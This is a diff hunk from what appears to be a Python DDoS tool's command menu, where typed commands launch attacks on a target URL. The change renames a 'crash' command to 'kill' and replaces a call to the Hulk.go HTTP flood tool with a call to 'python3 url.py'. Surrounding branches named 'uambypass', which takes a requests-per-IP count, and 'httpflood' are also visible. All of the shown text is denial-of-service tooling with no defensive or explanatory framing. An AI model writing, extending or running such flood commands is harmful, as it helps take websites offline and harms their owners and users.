@@ -598,14 +598,14 @@ def main():
                 print('Usage: uambypass <url> <time> <req_per_ip>')
                 print('Example: uambypass http://example.com 60 1250')
 
-        elif "crash" in cnc:
+        elif "kill" in cnc:
             try:
                 url = cnc.split()[1]
                 method = cnc.split()[2]
-                os.system(f'go run Hulk.go -site {url} -data {method}')
+                os.system(f'python3 url.py {url}')
             except IndexError:
-                print('Usage: crash <url> METHODS<GET/POST>')
-                print('Example: crash http://example.com GET')
+                print('Usage: kill <url>')
+                print('Example: kill http://example.com')
 
         elif "httpflood" in cnc:
             try:
